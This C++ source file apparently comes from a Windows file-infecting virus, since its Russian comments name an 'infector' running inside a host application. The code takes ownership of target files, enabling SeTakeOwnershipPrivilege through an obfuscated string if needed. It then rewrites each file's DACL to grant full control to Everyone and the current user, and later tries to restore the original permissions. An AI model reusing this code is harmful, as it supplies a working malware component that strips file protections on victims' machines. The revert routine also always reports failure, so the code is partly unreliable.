#include "access.hpp"
#include "strings.hpp"

FileSecurityManager::~FileSecurityManager()
{
	if (this->pSecurityDescriptor != nullptr)
	{
		LocalFree(this->pSecurityDescriptor);
		this->pSecurityDescriptor = nullptr;
	}
	if (this->pwFilePath != nullptr)
	{
		delete[]this->pwFilePath;
		this->pwFilePath = nullptr;
	}

	this->pDacl = nullptr;
	this->pSacl = nullptr;
	this->pSidGroup = nullptr;
	this->pSidOwner = nullptr;
}

FileSecurityManager::FileSecurityManager()
{
	this->pDacl = nullptr;
	this->pSacl = nullptr;
	this->pSidGroup = nullptr;
	this->pSidOwner = nullptr;
	this->pSecurityDescriptor = nullptr;
	this->pwFilePath = nullptr;
}

// инициализируем секурицу, нащалника
BOOL FileSecurityManager::init(PWCHAR pwFileObject, DWORD dwFlags)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[FileSecurityManager::init] getting security info flags 0x%x from %s", dwFlags, pwFileObject);
	WriteLog(debugOut);
#endif
	DWORD dwRet = GetNamedSecurityInfoW(pwFileObject, SE_FILE_OBJECT, dwFlags, &this->pSidOwner, &this->pSidGroup, &this->pDacl, &this->pSacl, &this->pSecurityDescriptor);
	
	if (dwRet == ERROR_SUCCESS)
	{
		this->pwFilePath = new WCHAR[wcslen(pwFileObject) + 2];
		if (this->pwFilePath)
			wcscpy(this->pwFilePath, pwFileObject);
		this->dwRevertFlags = dwFlags;
	}

#ifdef _DEBUG
	this->print_debug(dwRet);
#endif

	return (dwRet == ERROR_SUCCESS);
}

BOOL FileSecurityManager::get(DWORD dwFlags)
{
	BOOL bRet = FALSE;
	PSID pSIDEveryone = nullptr;
	PACL pACL = nullptr;
	PTOKEN_OWNER pCurrentOwner = nullptr;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;

	const int NUM_ACES = 2;
	EXPLICIT_ACCESSW ea[NUM_ACES];
	DWORD dwRes;

	CCryptString cStr_SeTakeOwnershipPrivilege(cryptedstr_SeTakeOwnershipPrivilege);
	
	RtlSecureZeroMemory(&ea, NUM_ACES * sizeof(EXPLICIT_ACCESS));

	
	do
	{
		if (!this->getownersid(&pCurrentOwner))
		{
#ifdef _DEBUG
			WriteLog(L"[FileSecurityManager::get] cant get TOKEN_OWNER of current thread token");
#endif
			break; // понять и простить
		}

		if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone))
		{
#ifdef _DEBUG
			WriteLog(L"[FileSecurityManager::get] cant allocate and initialize sid for SECURITY_WORLD_SID_AUTHORITY");
#endif
			break;
		}

		ea[0].grfAccessPermissions = GENERIC_ALL;
		ea[0].grfAccessMode = SET_ACCESS;
		ea[0].grfInheritance = NO_INHERITANCE;
		ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
		ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
		ea[0].Trustee.ptstrName = (LPWSTR)pSIDEveryone;

		ea[1].grfAccessPermissions = GENERIC_ALL;
		ea[1].grfAccessMode = SET_ACCESS;
		ea[1].grfInheritance = NO_INHERITANCE;
		ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
		ea[1].Trustee.TrusteeType = TRUSTEE_IS_UNKNOWN;
		ea[1].Trustee.ptstrName = (LPWSTR)pCurrentOwner->Owner;

		if (SetEntriesInAclW(NUM_ACES, ea, NULL, &pACL) != ERROR_SUCCESS)
		{
#ifdef _DEBUG
			WriteLog(L"[FileSecurityManager::get] error SetEntriesInAclA failed");
#endif
			break;
		}

		// сначала пробуем установить без включения привилегии
		dwRes = SetNamedSecurityInfoW(this->pwFilePath, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pCurrentOwner->Owner, NULL, NULL, NULL);
		if (dwRes != ERROR_SUCCESS)
		{
			if ((!access_api::SetPrivilege(cStr_SeTakeOwnershipPrivilege.w_str(), TRUE)) || (ERROR_SUCCESS != SetNamedSecurityInfoW(this->pwFilePath, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pCurrentOwner->Owner, NULL, NULL, NULL)))
			{
#ifdef _DEBUG
				WriteLog(L"[FileSecurityManager::get] error cant set owner of file");
#endif
				break;
			}
		}

		bRet = (SetNamedSecurityInfoW(this->pwFilePath, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL) == ERROR_SUCCESS);

#ifdef _DEBUG
		if (bRet)
			WriteLog(L"[FileSecurityManager::get] Successfully changed owner and DACL of file ", this->pwFilePath);
		else
			WriteLog(L"[FileSecurityManager::get] error SetNamedSecurityInfoW cant set DACL");
#endif

	} while (FALSE);

	if (pCurrentOwner)
		delete[]pCurrentOwner;

	if (pSIDEveryone)
		FreeSid(pSIDEveryone);

	if (pACL)
		LocalFree(pACL);

	return bRet;
}

// TODO: при revert теряется часть информации - разобраться
BOOL FileSecurityManager::revert()
{

	ULONG iEntries = 0;
	EXPLICIT_ACCESSW *pEA = nullptr;
	PACL pACL = nullptr;
	BOOL bRet = FALSE;
	do
	{
		if (this->pDacl != nullptr)
		{
#ifdef _DEBUG
			WriteLog(L"[FileSecurityManager::revert] creating new ACL object from existing");
#endif
			if (GetExplicitEntriesFromAclW(this->pDacl, &iEntries, &pEA) != ERROR_SUCCESS)
			{
#ifdef _DEBUG
				WriteLog(L"[FileSecurityManager::revert] error cant get explicit entries from acl");
#endif
				break;
			}

			// нам надо создать новый ACL объект исходя из существующего, говорящий о полной перезаписи DACL
			for (ULONG i = 0; i < iEntries; i++)
			{
				pEA[i].grfAccessMode = ACCESS_MODE::SET_ACCESS;
			}

			if (SetEntriesInAclW(iEntries, pEA, NULL, &pACL) != ERROR_SUCCESS)
			{
#ifdef _DEBUG
				WriteLog(L"[FileSecurityManager::revert] error SetEntriesInAclW");
#endif
				break;
			}
		}

		//bRet = (ERROR_SUCCESS == SetNamedSecurityInfoW(this->pwFilePath, SE_FILE_OBJECT, this->dwRevertFlags, this->pSidOwner, this->pSidGroup, pACL, this->pSacl));
		
		if (this->dwRevertFlags & DACL_SECURITY_INFORMATION)
		{
#ifdef _DEBUG
			WriteLog(L"[FileSecurityManager::revert] reverting DACL");
#endif
			bRet &= (ERROR_SUCCESS == SetNamedSecurityInfoW(this->pwFilePath, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL));
		}

		if (this->dwRevertFlags & OWNER_SECURITY_INFORMATION)
		{
#ifdef _DEBUG
			WriteLog(L"[FileSecurityManager::revert] reverting owner");
#endif
			bRet &= (ERROR_SUCCESS == SetNamedSecurityInfoW(this->pwFilePath, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, this->pSidOwner, NULL, NULL, NULL));
		}
		



#ifdef _DEBUG
		if (bRet)
			WriteLog(L"[FileSecurityManager::revert] Successfully reverted ACL and owner of file ", this->pwFilePath);
		else
			WriteLog(L"[FileSecurityManager::revert] error reverting ACL and owner of file ", this->pwFilePath);
#endif
	} while (FALSE);

	if (pEA != nullptr)
		LocalFree(pEA);

	if (pACL != nullptr)
		LocalFree(pACL);

	return bRet;
}

#ifdef _DEBUG
void FileSecurityManager::print_debug(DWORD dwRet)
{
	WCHAR debugOut[1024];
	PWCHAR StringSidOwner = nullptr;
	wsprintfW(debugOut, L"[FileSecurityManager::init] GetNamedSecurityInfoW last error = %d pSidOwner = 0x%x, pSidGroup = 0x%x, pDacl = 0x%x, pSacl = 0x%x, pSecurityDescriptor = 0x%x",
		dwRet, this->pSidOwner, this->pSidGroup, this->pDacl, this->pSacl, this->pSecurityDescriptor);
	WriteLog(debugOut);

	if (this->pSidOwner != nullptr)
	{
		if ((ConvertSidToStringSidW(this->pSidOwner, &StringSidOwner)) && (StringSidOwner != nullptr))
			WriteLog(L"[FileSecurityManager::init] SID Owner: ", StringSidOwner);

		if (StringSidOwner != nullptr)
			LocalFree(StringSidOwner);
	}

	if (this->pDacl)
	{
		ULONG iEntries = 0;
		EXPLICIT_ACCESSW *pEA = nullptr;
		if (GetExplicitEntriesFromAclW(this->pDacl, &iEntries, &pEA) == ERROR_SUCCESS)
		{
			for (ULONG i = 0; i < iEntries; i++)
			{
				wsprintfW(debugOut, L"[FileSecurityManager::print_debug] ea[%d] grfAccessPermissions = 0x%x, grfAccessMode = 0x%x, grfInheritance = 0x%x", i, pEA[i].grfAccessPermissions, pEA[i].grfAccessMode, pEA[i].grfInheritance);
				WriteLog(debugOut);

				wsprintfW(debugOut, L"[FileSecurityManager::print_debug] ea[%d].Trustee TrusteeForm = 0x%x, TrusteeType = 0x%x", i, pEA[i].Trustee.TrusteeForm, pEA[i].Trustee.TrusteeType);
				WriteLog(debugOut);
			}
		}

		if (pEA != nullptr)
			LocalFree(pEA);
	}

}
#endif

BOOL FileSecurityManager::getownersid(TOKEN_OWNER **pptokownerSid)
{
	if (pptokownerSid == nullptr)
		return FALSE;

	BOOL bRet = FALSE;
	HANDLE hToken = NULL;
	DWORD dwRetLen = 0;
	PTOKEN_OWNER pOwnerSid = nullptr;
	do
	{

		hToken = access_api::GetCurrentToken(TOKEN_READ);
		if (hToken == NULL)
		{
#ifdef _DEBUG
			WriteLog(L"[FileSecurityManager::getownersid] cant get current token");
#endif
			break;
		}

		GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS::TokenOwner, nullptr, NULL, &dwRetLen);
		if (dwRetLen == 0)
		{
#ifdef _DEBUG
			WriteLog(L"[FileSecurityManager::getownersid] cant get length of TokenOwner");
#endif
			break;
		}

		pOwnerSid = (PTOKEN_OWNER)new BYTE[dwRetLen + 1];
		if (pOwnerSid == nullptr)
		{
#ifdef _DEBUG
			WriteLog(L"[FileSecurityManager::getownersid] cant alloc TOKEN_OWNER");
#endif
			break;
		}

		if (!GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS::TokenOwner, pOwnerSid, dwRetLen, &dwRetLen))
		{
#ifdef _DEBUG
			WriteLog(L"[FileSecurityManager::getownersid] cant get token information");
#endif
			break;
		}

		*pptokownerSid = pOwnerSid;
		bRet = TRUE;

#ifdef _DEBUG
		PWCHAR pwStringSIDOwner = nullptr;
		if ((ConvertSidToStringSidW(pOwnerSid->Owner, &pwStringSIDOwner)) && (pwStringSIDOwner != nullptr))
			WriteLog(L"[FileSecurityManager::getownersid] Current token Owner SID: ", pwStringSIDOwner);

		if (pwStringSIDOwner != nullptr)
			LocalFree(pwStringSIDOwner);
#endif

	} while (FALSE);

	if (hToken != NULL)
		CloseHandle(hToken);

	if ((bRet == FALSE) && (pOwnerSid != nullptr))
	{
		delete[]pOwnerSid;
		pOwnerSid = nullptr;
	}

	return bRet;
}

BOOL access_api::SetPrivilege(LPWSTR Privilege, BOOL bEnablePrivilege)
{

	TOKEN_PRIVILEGES tp;
	LUID luid;
	TOKEN_PRIVILEGES tpPrevious;
	DWORD cbPrevious = sizeof(TOKEN_PRIVILEGES);

	HANDLE hToken = NULL;

	BOOL bRet = FALSE;
	do
	{
		hToken = access_api::GetCurrentToken(TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY);
		if (hToken == NULL)
		{
#ifdef _DEBUG
			WriteLog(L"[access_api::SetPrivilege] cant get current token");
#endif
			break;
		}

		if (!LookupPrivilegeValueW(NULL, Privilege, &luid))
		{
#ifdef _DEBUG
			WriteLog(L"[access_api::SetPrivilege] error LookupPrivilegeValueW for ", Privilege);
#endif
			break;
		}

		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		tp.Privileges[0].Attributes = 0;

		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), &tpPrevious, &cbPrevious);
		if (GetLastError() != ERROR_SUCCESS)
		{
#ifdef _DEBUG
			WriteLog(L"[access_api::SetPrivilege] error AdjustTokenPrivileges [1] ");
#endif
			break;
		}

		tpPrevious.PrivilegeCount = 1;
		tpPrevious.Privileges[0].Luid = luid;

		if (bEnablePrivilege)
		{
			tpPrevious.Privileges[0].Attributes |= (SE_PRIVILEGE_ENABLED);
		}
		else
		{
			tpPrevious.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
				tpPrevious.Privileges[0].Attributes);
		}

		AdjustTokenPrivileges(hToken, FALSE, &tpPrevious, cbPrevious, NULL,	NULL);
		if (GetLastError() != ERROR_SUCCESS)
		{
#ifdef _DEBUG
			WriteLog(L"[access_api::SetPrivilege] error AdjustTokenPrivileges [2]");
#endif
			break;
		}

		bRet = TRUE;

	} while (FALSE);

	if (hToken)
		CloseHandle(hToken);

	return bRet;
}

HANDLE access_api::GetCurrentToken(DWORD dwAccessFlags)
{
	HANDLE hToken = NULL;
	do
	{
		// попытаемся открыть сначала текущий поток, так как инфектор может запуститься с любого места хостового апп и мы могли наследовать токен после имперсонации
		// если имперсонации не было, то функция вернет ERROR_NO_TOKEN и тогда мы откроем процесс
		BOOL bOpenRet = OpenThreadToken(GetCurrentThread(), dwAccessFlags, TRUE, &hToken);
		DWORD dwLastError = GetLastError();

		if ((!bOpenRet) && (dwLastError != ERROR_NO_TOKEN))
		{
#ifdef _DEBUG
			WriteLog(L"[access_api::GetCurrentToken] cant open current thread token, however it exists");
#endif
			break;
		}

		// если у потока нет токена, то это означает, что имперсонации не было и владелец токена процесса по дефолту будет владельцем создаваемых объектов
		if ((dwLastError == ERROR_NO_TOKEN) && (!OpenProcessToken(GetCurrentProcess(), dwAccessFlags, &hToken)))
		{
#ifdef _DEBUG
			WriteLog(L"[access_api::GetCurrentToken] thread has no token, however we also cant open process token");
#endif
			break;
		}

	} while (FALSE);

	return hToken;
}
